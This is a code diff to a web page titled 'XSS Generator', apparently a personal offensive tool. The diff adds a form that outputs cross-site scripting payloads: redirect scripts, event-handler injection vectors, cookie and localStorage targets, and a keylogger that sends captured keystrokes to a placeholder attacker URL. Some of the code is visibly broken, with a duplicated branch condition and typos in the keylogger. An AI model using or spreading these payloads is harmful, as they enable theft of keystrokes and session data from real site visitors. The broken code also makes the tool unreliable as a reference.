@@ -7,9 +7,7 @@
 
         <!-- Bootstrap CSS -->
         <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
-        
         <link href="css/main_dark-theme.css" rel="stylesheet" id="theme-link">
-
         <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
 
         <title>XSS Generator</title>
@@ -25,19 +23,28 @@
                 <form id="form_shortcut">
                     <div class="row">
                         <div class="col">
-                            <label>Test</label>
-                            <input type="radio" name="shortcut" value="test"/> 
                             <label>Redirection</label>
-                            <input type="radio" name="shortcut" value="redirect"/> 
+                            <input type="radio" name="shortcut" value="redirect" id="redirect"/>
+                            <label>HTML Event</label>
+                            <input type="radio" name="shortcut" value="redirect" id="html_event"/>
+                            <label>Data</label>
+                            <input type="radio" name="shortcut" value="redirect" id="data"/>
+                            <label>Keylogger</label>
+                            <input type="radio" name="shortcut" value="redirect" id="keylogger"/>  
                         </div>
                         <div class="col">
-                            <label>output</label>
+                            <label for="input" class="form-label">output</label>
                             <textarea type="textarea" name="shortcut_output" id="shortcut_output"></textarea>
+                        </div>
+                    </div>
+                    <div class="row">
+                        <div class="col">
+                            <button type="submit" value="generate">Generate shortcut</button>
                         </div>
                     </div>
                 </form>
             </div>
-            <div id="encoding" class="row">
+            <div id="encoding" class="row mt-5">
                 <h3>String Encoding</h3>
                 <form id="form_encoding">
                     <div class="row">
@@ -76,6 +83,80 @@
             /*==========================================*/
             /*              ENCODING FUNCTIONS          */
             /*==========================================*/
+            $("#form_shortcut button").click(function(e){
+                e.preventDefault();
+                if($("#redirect").is(":checked")){
+                    
+                    payload_1=`window.location.replace('http://yourwebsite.here')\n`
+                    payload_2=`window.location.href('http://yourwebsite.here')\n`
+                    payload_3=`document.location.replace('http://yourwebsite.here')\n`
+                    payload_4=`document.location.href('http://yourwebsite.here')\n`
+                    payload_5=`<meta http-equiv="refresh" content="4; URL="'http://yourwebsite.here'\n`
+
+                    output_shortcut=payload_1+payload_2+payload_3+payload_4+payload_5
+  
+                }
+
+                else if($("#html_event").is(":checked")){
+
+                    payload_1=`<img src=x onerror=javascript_code>\n`
+                    payload_2=`<a onmouseover=javascript_code>click me</a>\n`
+                    payload_3=`<button onfocus=javascript_code autofocus>\n`
+                    payload_4=`<details ontoggle=javascript_code open>\n`
+                    payload_5=`<svg><animate onrepeat=javascript_code attributeName=x dur=1s repeatCount=2>\n`
+                    payload_6=`<svg><animate onbegin=javascript_code attributeName=x dur=1s>\n`
+
+                    output_shortcut=payload_1+payload_2+payload_3+payload_4+payload_5+payload_6
+
+                }
+
+                else if($("#html_event").is(":checked")){
+
+                    payload_1=`document.cookie\n`
+                    payload_2=`localStorage\n`
+                    payload_3=`<button onfocus=javascript_code autofocus>\n`
+                    payload_4=`<details ontoggle=javascript_code open>\n`
+                    payload_5=`<svg><animate onrepeat=javascript_code attributeName=x dur=1s repeatCount=2>\n`
+                    payload_6=`<svg><animate onbegin=javascript_code attributeName=x dur=1s>\n`
+
+                    output_shortcut=payload_1+payload_2+payload_3+payload_4+payload_5+payload_6
+
+                }
+
+                else if($("#keylogger").is(":checked")){
+
+                    payload_1=`<script>
+                                var buffer = [];
+                                var attacker = 'http://your_web.site/?msg='
+                                    document.onkeypress = function(e) {
+                                        var timestamp = Date.now() | 0;
+                                        var stroke = {
+                                            k: e.key,
+                                            t: timestamp
+                                        };
+                                        buffer.push(stroke);
+                                    }
+                                    window.setInterval(function() {
+                                        if (buffer.length > 0) {
+                                            var data = encodeURIComponent(JSON.stringify(buffer));
+                                            new Image(.src = attacker + data;
+                                            buiffer = [];
+                                        }
+                                    }, 200);
+                                <\/script>`;
+
+
+                    output_shortcut=payload_1
+
+                }
+
+                $('#shortcut_output').val(output_shortcut);
+
+            })
+
+            /*==========================================*/
+            /*              ENCODING FUNCTIONS          */
+            /*==========================================*/
             $("#form_encoding button").click(function(e){
                 e.preventDefault();
                 var input_text = $("#form_encoding #encoding_input").val()
@@ -102,9 +183,7 @@
                     input_text = input_text.split(',')
                     // Convert each ascii code to letter
                     for (var i=0; i<input_text.length; i++){
-                        console.log(input_text[i])
                             ascii_code = input_text[i]
-                            console.log(ascii_code)
                             output_text = output_text+String.fromCharCode(ascii_code)
                         }
                 }
@@ -113,8 +192,6 @@
         
 
                 // Case String.fromCharCode()
-
-                
 
 
                 // Case CharCodeAt()
